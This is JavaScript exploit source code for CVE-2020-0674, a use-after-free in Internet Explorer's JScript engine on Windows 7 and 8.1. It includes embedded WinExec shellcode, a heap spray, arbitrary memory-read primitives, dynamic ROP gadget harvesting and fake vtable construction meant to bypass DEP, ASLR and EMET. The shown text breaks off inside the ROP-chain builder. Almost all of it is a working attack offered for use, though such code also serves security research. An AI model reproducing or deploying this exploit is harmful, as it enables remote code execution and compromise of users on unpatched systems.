/*;; --------------------------------------------------------------------- |
;;;; CVE-2020-0674 - Jscript.dll x86 Use After Free                        |
;;;; --------------------------------------------------------------------- |
;;;; Author: deadlock (Forrest Orr) - 2021                                 |
;;;; --------------------------------------------------------------------- |
;;;; Contact: forrest.orr@protonmail.com                                   |
;;;; --------------------------------------------------------------------- |
;;;; Licensed under GNU GPLv3                                              |
;;;; --------------------------------------------------------------------- |
;;;; Tested within Windows 7 32 and 64-bit:                                |
;;;;   ~ Internet Explorer 8 32-bit                                        |
;;;;   ~ Internet Explorer 11 32-bit                                       |
;;;;   ~ WPAD Service (32-bit)                                             |
;;;; --------------------------------------------------------------------- |
;;;; Bypasses: DEP, ASLR, EMET 5.5 EAF+, stack pivot protection, SimExec,  |
;;;;           CallerCheck                                                 |
;;;; --------------------------------------------------------------------- |
;;;; ## Notes                                                              |
;;;;  ~ Can be run either standalone for RCE or as a sandbox escape/LPE    |
;;;;    via WPAD.                                                          |
;;;;  ~ EAF+ bypassed via export resolutions through the IAT rather than   |
;;;;    export tables.                                                     |
;;;;  ~ Hook-based EMET mitigations are bypassed via a direct syscall ROP  |
;;;;    chain to NTDLL.DLL!NtProtectVirtualMemory where the syscall number |
;;;;    is directly populated via a ROP proxy stub.                        |
;;;;  ~ Shellcode will be picked up by EMET stack pivot protection if it   |
;;;;    does not pivot ESP back to a valid address within the stack range  |
;;;;    specified within the TEB. At the time the shellcode is executed,   |
;;;;    the stack will have been pivoted to a region in the heap.          |
;;;;  ~ IAT export resolution is substantially more CPU intensive, as a    |
;;;;    binary sort algorithm cannot be used. This performance was         |
;;;;    optimized through use of hint indexes.                             |
;;;;  ~ ROP chain creation in this exploit is dynamic. Resolution of these |
;;;;    gadget addresses is expedited through use of hint exports and      |
;;;;    deltas which provide points of reference from which to scan .text  |
;;;;    sections for gadget byte sequences.                                |
;;;; --------------------------------------------------------------------- |
;;;; ## Credits                                                            |
;;;;  ~ maxpl0it - for doing the original analysis and PoC for             |
;;;;    CVE-2020-0674 on IE8/11 on Windows 7 x64.                          |
;;;; -------------------------------------------------------------------- */

var SortArray = new Array(); // Array to be "sorted" by glitched method
for(var i = 0; i <= 150; i++) SortArray[i] = [0, 0]; // An array of arrays to be sorted by glitched sort method. Doing this at the very start of the JS is important to avoid stack issues, and is essential within WPAD.
var WindowsVersion = 7; // Exploit will run up until EIP hijack on 8.1, then be stopped by CFG. Primary target for this exploit is Windows 7 x64 IE8 32-bit.
var WindowsArch = "x64"; // Can be "x64" or "x86". Note that this is the OS architecture, not the IE architecture (this exploit is for 32-bit IE only).
var Shellcode = [ 0x68e58960, 0x000d4e88, 0x000020e8, 0x6fea6800, 0xe8500000, 0x00000061, 0x64617068, 0x6f6e6800, 0xe1896574, 0xff51056a, 0x61ec89d0, 0xe58955c3, 0x30be5657, 0x64000000, 0x0c408bad, 0x8918788b, 0xebc031fe, 0x74f73904, 0x74f68528, 0x245e8d24, 0x1474db85, 0x85044b8b, 0x6a0d74c9, 0x5de85101, 0x3b000001, 0x06740845, 0x368bc031, 0x468bd7eb, 0x895f5e10, 0x04c25dec, 0xe5895500, 0x0230ec81, 0x458b0000, 0xf8458908, 0x03f8558b, 0xc0833c42, 0xf0458904, 0x8914c083, 0xc289f445, 0x0308458b, 0x4a8b6042, 0xd04d8964, 0x89fc4589, 0x08458bc2, 0x89204203, 0x558bec45, 0x08458bfc, 0x89244203, 0x558be445, 0x08458bfc, 0x891c4203, 0xc031e845, 0x89e04589, 0x458bd845, 0x18408bfc, 0x0fe0453b, 0x0000d286, 0xe0458b00, 0x00850c8d, 0x8b000000, 0x458bec55, 0x11040308, 0x6ad44589, 0xbde85000, 0x3b000000, 0x850f0c45, 0x000000a1, 0x8de0458b, 0x458b0014, 0x04b70fe4, 0x850c8d02, 0x00000000, 0x8be8558b, 0x04030845, 0xd8458911, 0x89fc4d8b, 0xd05503ca, 0x7f7cc839, 0x7b7dd039, 0x00d845c7, 0x31000000, 0xd09d8dc9, 0x8afffffd, 0xfa800814, 0x80207400, 0x15752efa, 0x642e03c7, 0xc3836c6c, 0x0003c604, 0xfed09d8d, 0xeb41ffff, 0x411388de, 0xc6d8eb43, 0x9d8d0003, 0xfffffdd0, 0xe853006a, 0x0000003c, 0xfea3e850, 0xc085ffff, 0x45892974, 0x8d006adc, 0xfffed095, 0x21e852ff, 0x50000000, 0xe8dc75ff, 0xfffffed1, 0xebd84589, 0xe0458d0a, 0x1fe900ff, 0x8bffffff, 0xec89d845, 0x0008c25d, 0x57e58955, 0x8b084d8b, 0xdb310c7d, 0x74003980, 0x01b60f14, 0xb60f600c, 0xd1d301d0, 0xff8541e3, 0xeb41ea74, 0x5fd889e7, 0xc25dec89, 0x00000008, ]; // WinExec

var EnableDebug = false;
var EnableTimers = false;
var AlertOutput = false;
var TimeStart;
var ReadCount;

function StartTimer() {
    ReadCount = 0;
    TimeStart = new Date().getTime();
}

function EndTimer(Message) {
    var TotalTime = (new Date().getTime() - TimeStart);
    
    if(EnableTimers) {
        if(AlertOutput) {
            alert("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
        else {
            console.log("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
    }
}

function DebugLog(Message) {
    if(EnableDebug) {
        if(AlertOutput) {
            alert(Message);
        }
        else {
            console.log(Message); // In IE, console only works if devtools is open.
        }
    }
}

var UntrackedVarSet;
var VarSpray;
var VarSprayCount = 20000; // 200 GcBlocks
var NameListAnchors;
var NameListAnchorCount = 0; // The larger this number the more reliable the exploit on Windows 8.1 where LFH cannot easily re-claim
var SortDepth = 0;

function GlitchedComparator(Untracked1, Untracked2) {
    Untracked1 = VarSpray[SortDepth*2];
    Untracked2 = VarSpray[SortDepth*2 + 1];
    
    if(SortDepth >= 150) {
        VarSpray = new Array(); // Erase references to sprayed vars within GcBlocks
        CollectGarbage(); // Free the GcBlocks
        UntrackedVarSet.push(Untracked1);
        UntrackedVarSet.push(Untracked2);
    }
    else {
        SortDepth += 1;
        
        // There is a difference between the stack size between WPAD and Internet Explorer. In IE, a stack overflow exception will occur around depth 250 however in WPAD it will occur on a depth of less than 150, ensuring a stack overflow exception/alert will be thrown in the exploit. This try/catch in conjunction with a global initialization of the sort array allows the depth to be sufficient to produce an untracked var which will overlap with the type confusion offset in the re-claimed GcBlock.
        
        try {
            SortArray[SortDepth].sort(GlitchedComparator);
        }
        catch(ex) {
            VarSpray = new Array(); // Erase references to sprayed vars within GcBlocks
            CollectGarbage(); // Free the GcBlocks
        }
        
        UntrackedVarSet.push(Untracked1);
        UntrackedVarSet.push(Untracked2);
    }
    
    return 0;
}

function NewUntrackedVarSet() {
    SortDepth = 0;
    VarSpray = new Array();
    NameListAnchors = new Array();
    UntrackedVarSet = new Array();
    for(var i = 0; i < NameListAnchorCount; i++) NameListAnchors[i] = new Object(); // Overlay must happen before var spray
    for(var i = 0; i < VarSprayCount; i++) VarSpray[i] = new Object();
    CollectGarbage();
    SortArray[0].sort(GlitchedComparator); // Two untracked vars will be passed to this method by the JS engine
}

var AnchorObjectsBackup;
var LeakedAnchorIndex = -1;
var SizerPropName = Array(379).join('A');
var MutableVar;
var ReClaimNameList;

function ReClaimIndexNameList(Value, PropertyName) { // Windows 7 LIFO LFH re-claim for UAF
    CollectGarbage(); // Cleanup - note that removing this has not damaged stability of the exploit in any of my own tests and its removal significantly improved exploit performance (each arbitrary read is about twice as fast). I've left it here from maxspl0it's original version of the exploit to ensure stability.
    AnchorObjectsBackup[LeakedAnchorIndex] = null; // Delete the anchor associated with the leaked NameList allocation
    CollectGarbage(); // Free the leaked NameList
    AnchorObjectsBackup[LeakedAnchorIndex] = new Object();
    AnchorObjectsBackup[LeakedAnchorIndex][SizerPropName] = 1; // 0x17a property name size for 0x648 NameList allocation size
    AnchorObjectsBackup[LeakedAnchorIndex]["BBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
    AnchorObjectsBackup[LeakedAnchorIndex]["\u0003"] = 1;
    AnchorObjectsBackup[LeakedAnchorIndex][PropertyName] = Value; // The mutable variable
    ReadCount++;
}

function ReClaimBackupNameLists(Value, PropertyName) { // Windows 8.1+ Non-Derterminstic LFH re-claim for UAF
    var PrecisionReClaimAllocCount = 500; // This is the number of re-claim attempts that are needed for a precision re-claim of a single freed region, not hundreds such as in the case of the GcBlock/type confusion re-claims. On IE8/11 300 is plenty, on WPAD 500 seems to be more stable. 
    CollectGarbage(); // Cleanup
    
    if(InitialReClaim) {
        AnchorObjectsBackup[LeakedAnchorIndex] = null;
        InitialReClaim = false;
        PrecisionReClaimAllocCount -= 1;
        AnchorObjectsBackup[LeakedAnchorIndex] = new Object(); // Clog the index
    }
    
    for(var i = 0; i < PrecisionReClaimAllocCount; i++) {
        if(i != LeakedAnchorIndex) AnchorObjectsBackup[i] = null;
    }
    
    CollectGarbage(); // Free the leaked NameList
    
    for(var i = 0; i < PrecisionReClaimAllocCount; i++) {
        if(i != LeakedAnchorIndex) AnchorObjectsBackup[i] = new Object();
        AnchorObjectsBackup[i][SizerPropName] = 1; // 0x17a property name size for 0x648 NameList allocation size
        AnchorObjectsBackup[i]["BBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
        AnchorObjectsBackup[i]["\u0003"] = 1;
        AnchorObjectsBackup[i][PropertyName] = Value; // The mutable variable
    }
    
    ReadCount++;
}

function CreateVar32(Type, ObjPtr, NextVar) {
   var Data = new Array(); // Every element of this array will be a WORD
   Data.push(Type, 0x00, 0x00, 0x00, ObjPtr & 0xFFFF, (ObjPtr >> 16) & 0xFFFF, NextVar & 0xFFFF, (NextVar >> 16) & 0xFFFF);
   return String.fromCharCode.apply(null, Data);
}

function LeakByte32(Address) {
    ReClaimNameList(0, CreateVar32(0x8, Address + 2, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    return (MutableVar.length >> 15) & 0xff; // Shift to align and get the byte.
}

function LeakWord32(Address) {
    ReClaimNameList(0, CreateVar32(0x8, Address + 2, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    return ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
}

function LeakDword32(Address) {
    ReClaimNameList(0, CreateVar32(0x8, Address + 2, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    var LowWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(0, CreateVar32(0x8, Address + 4, 0)); // +4 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    var HighWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    return LowWord + (HighWord << 16);
}

function LeakObjectAddress32(ObjVarAddress, ObjVarValue) { // This function does not always work, there are some edge cases. For example if a BSTR is declared var A = "123"; it works fine. However, var A = "1"; A += "23"; resuls in multiple layers of VARs referencing VARs and this function will no longer get the actual BSTR address.
    ReClaimNameList(ObjVarValue, CreateVar32(0x8, ObjVarAddress + 8 + 2, 0)); // Skip +8 over Type field of VAR to object pointer field and +2 for BSTR length adjustment
    var LowWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(ObjVarValue, CreateVar32(0x8, ObjVarAddress + 8 + 4, 0)); // +4 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field) and +8 to skip over VAR Type
    var HighWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    return LeakDword32((LowWord + (HighWord << 16)) + 8); // The VAR at the start of the VVAL has an object pointer that points to yet another VAR: this second one will have the actual address of the object in its object pointer field
}

function DiveModuleBase32(Address) {
    var Base = (Address & 0xFFFF0000) + 0x4e; // Offset of "This program cannot be run in DOS mode" in PE header.
    
    while(true) {
        if(LeakWord32(Base) == 0x6854) { // 'hT'
            if(LeakWord32(Base + 2) == 0x7369) { // 'si'
                return (Base - 0x4E);
            }
        }
        
        Base -= 0x10000;
    }
    
    return 0;
}

function ResolveExport32(ModuleBase, TargetExportNameTable) {
    var FileHdr = LeakDword32(ModuleBase + 0x3c);
    var ExportDataDir = ModuleBase + FileHdr + 0x78;
    
    if(ExportDataDir) {
        var EATRva = LeakDword32(ExportDataDir);
        var TotalExports = LeakDword32(ModuleBase + EATRva + 0x14);
        var AddressRvas = LeakDword32(ModuleBase + EATRva + 0x1C);
        var NameRvas = LeakDword32(ModuleBase + EATRva + 0x20);
        var OrdinalRvas = LeakDword32(ModuleBase + EATRva + 0x24);
        var MaxIndex = TotalExports;
        var MinIndex = 0;
        var CurrentIndex = Math.floor(TotalExports / 2);
        var TargetTableIndex = 0;
        var BinRes = 0;
        
        while(TotalExports) { 
            var CurrentNameRva = LeakDword32(ModuleBase + NameRvas + 4*CurrentIndex);

            while (TargetTableIndex < TargetExportNameTable.length) {
                CurrentNameWord = LeakWord32(ModuleBase + (CurrentNameRva + (4 * TargetTableIndex)));
                var ExportNameWord = (TargetExportNameTable[TargetTableIndex] & 0x0000FFFF);
                var SanitizedCurrentNameWord = NullSanitizeWord(CurrentNameWord);
                BinRes = BinaryCmp(ExportNameWord, SanitizedCurrentNameWord);

                if(!BinRes) {
                    ExportNameWord = ((TargetExportNameTable[TargetTableIndex] & 0xFFFF0000) >> 16);
                    
                    if(ExportNameWord != 0) { // Special case: final WORD of name array is 0, consider this a match
                        CurrentNameWord = LeakWord32(ModuleBase + (CurrentNameRva + (4 * TargetTableIndex)) + 2);
                        SanitizedCurrentNameWord = NullSanitizeWord(CurrentNameWord);
                        BinRes = BinaryCmp(ExportNameWord, SanitizedCurrentNameWord);
						
                        if(!BinRes) {
                            if((TargetTableIndex + 1) >= TargetExportNameTable.length) {
                                Ordinal = LeakWord32(ModuleBase + OrdinalRvas + 2*CurrentIndex);
                                MainExport = (ModuleBase + LeakDword32(ModuleBase + AddressRvas + 4*Ordinal));
                                return [ MainExport , CurrentIndex];
                            }
                            
                            TargetTableIndex++;
                        }
                        else {
                            TargetTableIndex = 0;
                            break;
                        }
                    }
                    else {
                        if((TargetTableIndex + 1) >= TargetExportNameTable.length) {
                            Ordinal = LeakWord32(ModuleBase + OrdinalRvas + (2 * CurrentIndex));
                            MainExport = (ModuleBase + LeakDword32(ModuleBase + AddressRvas + (4 * Ordinal)));
                            return [ MainExport, CurrentIndex];
                        }
                        else {
                            alert("Fatal error during export lookup: target export name array contained a NULL byte not at the end of its final element");
                        }
                    }
                }
                else {
                    TargetTableIndex = 0;
                    break;
                }
            }
            
            if(BinRes == 1) { // Target is greater than what it was compared to: reduce current index
                if(MaxIndex == CurrentIndex) {
                    DebugLog("Failed to find export: index hit max");
                    break;
                }
                
                MaxIndex = CurrentIndex;
                CurrentIndex = Math.floor((CurrentIndex + MinIndex) / 2);
            } 
            else if (BinRes == -1) { // Target is less than what it was compared to: enhance current index
                if(MinIndex == CurrentIndex) {
                    DebugLog("Failed to find export: index hit min");
                    break;
                }
                
                MinIndex = CurrentIndex;
                CurrentIndex = Math.floor((CurrentIndex + MaxIndex) / 2);
            }
            
            if(CurrentIndex == MaxIndex && CurrentIndex == MinIndex) {
                DebugLog("Failed to find export: current, min and max indexes are all equal");
                break;
            }
        }
    }
    
    return [0,0];
}

function CheckINTThunk(ModuleBase, INTThunkRva, TargetImportNameTable) {
    var INTThunkValue = LeakDword32(ModuleBase + INTThunkRva);
    
    if(INTThunkValue == 0) {
        return -1;
    }
    
    if((INTThunkValue & 0x80000000) == 0) { // Only parse non-orginal INT entries
        var ImportNameAddress = (ModuleBase + INTThunkValue + 2); // The INT thunk is an RVA pointing at a IMAGE_IMPORT_BY_NAME struct. Skip the hint field in this struct to point directly to the ASCII import name.

        if(StrcmpLeak32(TargetImportNameTable, ImportNameAddress)) {
            return 1;
        }
    }
    
    return 0;
}

function ResolveImport32(ModuleBase, HintIndex, TargetModuleNameTable, TargetImportNameTable) {
    var ExtractedAddresss = 0;
    var FileHdr = LeakDword32(ModuleBase + 0x3c);
    var ImportDataDir = ModuleBase + FileHdr + 0x80; // Import data directory
    var ImportRva = LeakDword32(ImportDataDir);
    var ImportSize = LeakDword32(ImportDataDir + 0x4); // Get the size field of the import data dir
    var CurrentNameDesc = ModuleBase + ImportRva;
    
    while(ImportSize != 0) {
        NameField = LeakDword32(CurrentNameDesc + 0xc); // 0xc is the offset to the module name pointer
        
        if(NameField != 0) {
            if(StrcmpLeak32(TargetModuleNameTable, ModuleBase + NameField)) {
                // Found the target module by name. Walk its INT to check each name.
                
                var HighIATIndex = (HintIndex + 1);
                var LowIATIndex = (HintIndex - 1);
                var BaseINTThunkRva = (LeakDword32(CurrentNameDesc + 0x0));
                var BaseIATThunkRva = (LeakDword32(CurrentNameDesc + 0x10));
                var ResolvedIATIndex = -1;
                
                if(BaseINTThunkRva == 0) {
                    alert("INT is empty in target module");
                }
                
                // Start by checking the INT at the specified hint index
                
                if(CheckINTThunk(ModuleBase, BaseINTThunkRva + (HintIndex * 4), TargetImportNameTable)) {
                    ExtractedAddresss = LeakDword32(ModuleBase + BaseIATThunkRva);
                    break;
                }
                
                // Specified import was not found at the provided hint index. Walk the INT forward/backward in unison from the hint index.
                
                var HighINTThunkRva = (BaseINTThunkRva + (HighIATIndex * 4));
                var LowINTThunkRva = (BaseINTThunkRva + (LowIATIndex * 4));
                var HitINTThunkCeiling = 0;
                
                while(true) {
                    if(!HitINTThunkCeiling) {
                        var ThunkRes = CheckINTThunk(ModuleBase, HighINTThunkRva, TargetImportNameTable);
                        
                        if(ThunkRes == -1) {
                            HitINTThunkCeiling = 1;
                        }
                        else if(ThunkRes) {
                            ExtractedAddresss = LeakDword32(ModuleBase + BaseIATThunkRva + (HighIATIndex * 4));
                            ResolvedIATIndex = HighIATIndex;
                            break;
                        }
                        else {
                            HighINTThunkRva += 4;
                            HighIATIndex++;
                        }
                    }
                    
                    if(LowINTThunkRva >= BaseINTThunkRva) {
                        if(CheckINTThunk(ModuleBase, LowINTThunkRva, TargetImportNameTable)) {
                            ExtractedAddresss = LeakDword32(ModuleBase + BaseIATThunkRva + (LowIATIndex * 4));
                            ResolvedIATIndex = LowIATIndex;
                            break;
                        }
                        
                        LowINTThunkRva -= 4;
                        LowIATIndex--;
                    }
                }
                
                if(ExtractedAddresss != 0) {
                    DebugLog("Identified target import at IAT index " + ResolvedIATIndex.toString(10));
                    break;
                }
            }
            
            ImportSize -= 0x14;
            CurrentNameDesc += 0x14; // Next import descriptor in array
        }
        else {
            break;
        }
    }
    
    return ExtractedAddresss;
}

function ExtractBaseFromImports32(ModuleBase, TargetModuleNameTable) { // Grab the first IAT entry of a function within the specified module
    var ExtractedAddresss = 0;
    var FileHdr = LeakDword32(ModuleBase + 0x3c);
    var ImportDataDir = ModuleBase + FileHdr + 0x80; // Import data directory
    var ImportRva = LeakDword32(ImportDataDir);
    var ImportSize = LeakDword32(ImportDataDir + 0x4); // Get the size field of the import data dir
    var CurrentNameDesc = ModuleBase + ImportRva;
    
    while(ImportSize != 0) {
        NameField = LeakDword32(CurrentNameDesc + 0xc); // 0xc is the offset to the module name pointer
        
        if(NameField != 0) {
            if(StrcmpLeak32(TargetModuleNameTable, ModuleBase + NameField)) {
                ThunkAddress = LeakDword32(CurrentNameDesc + 0x10);
                ExtractedAddresss = LeakDword32(ModuleBase + ThunkAddress + 8); // +8 since __imp___C_specific_handler can cause issues when imported in some jscript instances
                break;
            }
            
            ImportSize -= 0x14;
            CurrentNameDesc += 0x14; // Next import descriptor in array
        }
        else {
            break;
        }
    }
    
    return ExtractedAddresss;
}

function HarvestGadget32(HintExportAddress, MaxDelta, Data, DataMask, MagicOffset) {
    var MaxHighOffset = (HintExportAddress + MagicOffset + MaxDelta);
    var MinLowOffset = ((HintExportAddress + MagicOffset) - MaxDelta);
    var LeakAddress = HintExportAddress + MagicOffset;
    var LeakFunc = LeakDword32; // In nthe event a 0x00FFFFFF mask is used, LeakDword32 will be used, but will still be filtered
    
    if(MinLowOffset < HintExportAddress) {
        MinLowOffset = HintExportAddress;
    }
    
    DebugLog("Hunting for gadget 0x" + Data.toString(16) + " betwee 0x" + MinLowOffset.toString(16) + " and 0x" + MaxHighOffset.toString(16) + " starting from 0x" + LeakAddress.toString(16));
    
    if(DataMask == 0x0000FFFF) {
        LeakFunc = LeakWord32;
    }
    else {
        alert("Unhaandled data mask for gadget harvest");
        return 0;
    }
    
    if((LeakFunc(LeakAddress) & DataMask) == Data) {
        DebugLog("Found gadget at expected delta of " + MagicOffset.toString(16));
    }
    else {
        var HighAddress = (LeakAddress + 1);
        var LowAddress = LeakAddress - 1;

        LeakAddress = 0;

        while(LowAddress >= MinLowOffset || HighAddress < MaxHighOffset) {
            if(LowAddress >= MinLowOffset) {
                if((LeakFunc(LowAddress) & DataMask) == Data) {
                    DebugLog("Found gadget from scan below magic at " + LowAddress.toString(16));
                    LeakAddress = LowAddress;
                    break;
                }
                
                LowAddress -= 1;
            }
            
            if(HighAddress < MaxHighOffset) {
                if((LeakFunc(HighAddress) & DataMask) == Data) {
                    DebugLog("Found gadget from scan above magic at " + HighAddress.toString(16));
                    LeakAddress = HighAddress;
                    break;
                }
                
                HighAddress += 1;
            }
        }
    }
    
    return LeakAddress;
}

function ResolveNtProtectProxyStub32(ScanAddress, MaxOffset) {
    /*
    Windows 7 x64 NTDLL Wow64 (EMET 5.5 hook enabled)
    
    7725001A | 64:FF15 C0000000         | call dword ptr fs:[C0]                  |
    77250021 | 83C4 04                  | add esp,4                               |
    77250024 | C2 0800                  | ret 8                                   |
    77250027 | 90                       | nop                                     |
    77250028 | E9 BB0857BF              | jmp 367C08E8                            | <- NtProtectVirtualMemory
    7725002D | CC                       | int3                                    |
    7725002E | CC                       | int3                                    |
    7725002F | 8D5424 04                | lea edx,dword ptr ss:[esp+4]            |
    77250033 | 64:FF15 C0000000         | call dword ptr fs:[C0]                  |
    7725003A | 83C4 04                  | add esp,4                               |
    7725003D | C2 1400                  | ret 14                                  |
    77250040 | B8 4E000000              | mov eax,4E                              | 4E:'N'
    77250045 | 33C9                     | xor ecx,ecx                             |
    77250047 | 8D5424 04                | lea edx,dword ptr ss:[esp+4]            |
    7725004B | 64:FF15 C0000000         | call dword ptr fs:[C0]                  |
    77250052 | 83C4 04                  | add esp,4                               |
    77250055 | C2 1400                  | ret 14                                  |
    
    Windows 7 x86 NTDLL 32-bit (EMET hook disabled)
    
    77305F18 | B8 D7000000              | mov eax,D7                              | <- NtProtectVirtualMemory
    77305F1D | BA 0003FE7F              | mov edx,<&KiFastSystemCall>             | <- stub resolved here
    77305F22 | FF12                     | call dword ptr ds:[edx]                 |
    77305F24 | C2 1400                  | ret 14                                  |
    */
    
    var Offset = 0;
    var LastMovEaxAddress = 0;
    var ProxyStubAddress = 0;
    var RetnScenarioOne = 0;
    var RetnScenarioTwo = 0;
    
    // Scan forward searching for 0xB8 opcode. Once one is found, scan forward until 0xC2 0x14 0x00 is found. Proxy stub address will be the address of the last 0xB8 opcode +5.
    
    while(Offset < MaxOffset) {
        var LeakAddress = ScanAddress + Offset;
        var LeakedWord = LeakWord32(LeakAddress);
        var ByteOne = (LeakedWord & 0x00FF);
        var ByteTwo = ((LeakedWord & 0xFF00) >> 8);
        
        if(ByteOne == 0xB8) {
            LastMovEaxAddress = LeakAddress;
        }
        else if(ByteTwo == 0xB8) {
            LastMovEaxAddress = (LeakAddress + 1);
        }
        
        else if(LastMovEaxAddress != 0) {
            if(!RetnScenarioOne) {
                if(ByteOne == 0xc2 && ByteTwo == 0x14) {
                    RetnScenarioOne = 1;
                }
            }
            else {
                if(ByteOne == 0x00) {
                    ProxyStubAddress = (LastMovEaxAddress + 5);
                    DebugLog("NtProtectVirtualMemory proxy stub scenario one scan success: 0x" + ProxyStubAddress.toString(16));
                    break;
                }
                else {
                    RetnScenarioOne = 0;
                }
            }
            
            if(!RetnScenarioTwo) {
                if(ByteTwo == 0xC2) {
                    RetnScenarioTwo = 1;
                }
            }
            else {
                if(ByteOne == 0x14 && ByteTwo == 0x00) {
                    ProxyStubAddress = (LastMovEaxAddress + 5);
                    DebugLog("NtProtectVirtualMemory proxy stub scenario two scan success: 0x" + ProxyStubAddress.toString(16));
                    break;
                }
                else {
                    RetnScenarioTwo = 0;
                }
            }
        }
        
        Offset += 2;
    }
    
    return ProxyStubAddress;
}

function ResolveGadgetSet32(MsvcrtBase) { // Dynamically resolve gadget addresses via delta from export addresses - MSVCRT.DLL is used to harvest gadgets as its EAT is not protected by EAF/EAF+
    var GadgetSetObj = new Object();
    
    DebugLog("Dynamically resolving ROP gadget addresses from MSVCRT.DLL export address hints from base " + MsvcrtBase.toString(16));
    
    // XCHG EAX, ESP ; RET
    // For Win7 x64 Wow64:
    // __libm_sse2_log10:0x0008dc45 (+0x4f0) <- 0x0008e135 -> (+0x670) __libm_sse2_log10f:0x0008e7a5
    // For Win8.1: 
    //__libm_sse2_log10:0x000a9b80 (+0x4e5) <- 0x000aa065 -> (+0x67b) __libm_sse2_log10f:0x000aa6e0

    var ExportPair = ResolveExport32(MsvcrtBase, [0x696c5f5f, 0x735f6d62, 0x5f326573, 0x31676f6c, 0x00000030]); // 'il__' 's_mb' '_2es' '1gol' '0'
    
    if(ExportPair[0]) {
        var MagicOffset = 0;
        
        if(WindowsVersion == 7) {
            MagicOffset = 0x4f0; // Win7 x64
        }
        else if(WindowsVersion == 8.1) {
            MagicOffset = 0x4e5;
        }
        
        GadgetSetObj.StackPivot = HarvestGadget32(ExportPair[0], 0x500, 0xc394, 0x0000FFFF, MagicOffset);
        
        if(GadgetSetObj.StackPivot != 0) {
            DebugLog("Stack pivot resolved to: " + GadgetSetObj.StackPivot.toString(16));
            GadgetSetObj.RopNop = (GadgetSetObj.StackPivot + 1);
            
            // POP EAX ; RET
            // Win7/8 (+0x13 and same export on both)
            // _safe_fdivr:0x00031821 (+0x13) <- 0x00031834 -> (+0x208) _adj_fprem:0x00031a3c

            ExportPair = ResolveExport32(MsvcrtBase, [0x6661735f, 0x64665f65, 0x00727669]); // 'fas_' 'df_e' 'rvi'
            
            if(ExportPair[0]) {
                GadgetSetObj.PopEax = HarvestGadget32(ExportPair[0], 0x100, 0xc358, 0x0000FFFF, 0x00000013); // Win7/8.1 have same offset
                
                if(GadgetSetObj.PopEax) {
                    return GadgetSetObj;
                }
                else {
                    DebugLog("Failed to resolve POP EAX gadget address");
                }
            }
            else {
                DebugLog("Failed to resolve msvcrt.dll!_safe_fdivr as export hint");
            }
        }
        else {
            DebugLog("Failed to resolve stack pivot gadget address");
        }
    }
    else {
        DebugLog("Failed to resolve msvcrt.dll!__libm_sse2_log10 as export hint");
    }
    
    return null;
}

function CreateFakeVtable32(FakeVtablePaddingSize, VtableSize, NtProtectAddress, ShellcodeAddress, RopGadgetSet, WritableAddress) {
    // [Padding]
    // [ROPNOP sled]
    // [Stack alignment gadget]
    // [Stack pivot]
    // [Set EAX to SYSCALL #]
    // [NtProtoectVirtualMemry] 
    // [Shellcode address] <- NtProtoectVirtualMemry return
    // [NtProtoectVirtualMemry parameters]
    // [Stack pivot]
    // [Padding]
    
    var FakeVtable = "";
    var Y = 0;
    var PaddingArrayLen = FakeVtablePaddingSize / 4;
    var TotalObjLen = ((FakeVtablePaddingSize + VtableSize) / 2);
    var PaddingArray = [];
    var SyscallNumber;

    for(var i = 0; i < PaddingArrayLen; i++) {
        PaddingArray[i] = 0x11111111;
    }
    
    FakeVtable += DwordArrayToBytes(PaddingArray);
    
    while (FakeVtable.length < TotalObjLen) {
        if(Y == 0x9c) {
            FakeVtable += DwordArrayToBytes([RopGadgetSet.StackPivot]);
        }
        else if(Y == 0x98) {
            FakeVtable += DwordArrayToBytes([RopGadgetSet.PopEax]);
        }
        else {
            FakeVtable += DwordArrayToBytes([RopGadgetSet.RopNop]);
        }
        
        Y += 4;
    }
    
    // Layout of storage address region
    // +0x0 | Original ESP
    // +0x4 | Shellcode address
    // +0x8 | Shellcode size
    // +0xC | Old protection
    
    FakeVtable += DwordArrayToBytes([RopGadgetSet.PopEax]);
    
    if(WindowsVersion == 8.1) {
        SyscallNumber = 0x4F; // Windows 8.1 x64 NtProtectVirtualMemory SYSCALL #
    }
    else {
        if(WindowsArch == "x64") {
            SyscallNumber = 0x4D; // Windows 7 x64 SP0/SP1 Wow64 NtProtectVirtualMemory SYSCALL #
        }
        else if(WindowsArch == "x86") {
            SyscallNumber = 0xD7; // Windows 7 x86 SP0/SP1 32-bit NtProtectVirtualMemory SYSCALL #
        }
    }
    
    // NTSTATUS NtProtectVirtualMemory(IN HANDLE ProcessHandle, IN OUT PVOID *BaseAddress, IN OUT PULONG RegionSize, IN ULONG NewProtect, OUT PULONG OldProtect); 
    
    FakeVtable += DwordArrayToBytes([SyscallNumber]);
    FakeVtable += DwordArrayToBytes([NtProtectAddress]);
    FakeVtable += DwordArrayToBytes([RopGadgetSet.RopNop]); // Return address
    FakeVtable += DwordArrayToBytes([0xFFFFFFFF]);
    FakeVtable += DwordArrayToBytes([WritableAddress + 0x4]);
    FakeVtable += DwordArrayToBytes([WritableAddress + 0x8]);
    FakeVtable += DwordArrayToBytes([0x40]); // +RX (PAGE_EXECUTE_READ) causes problems due to the page alignment used by NtProtectVirtualMemory. The shellcode is unlikely to begin on a clean multiple of 0x1000, and similarly won't probably end on one either (although this attribute can be manipulated with padding). +RW data on the heap surrounding the shellcode may end up +RX and this causes crashes.
    FakeVtable += DwordArrayToBytes([WritableAddress + 0xC]);
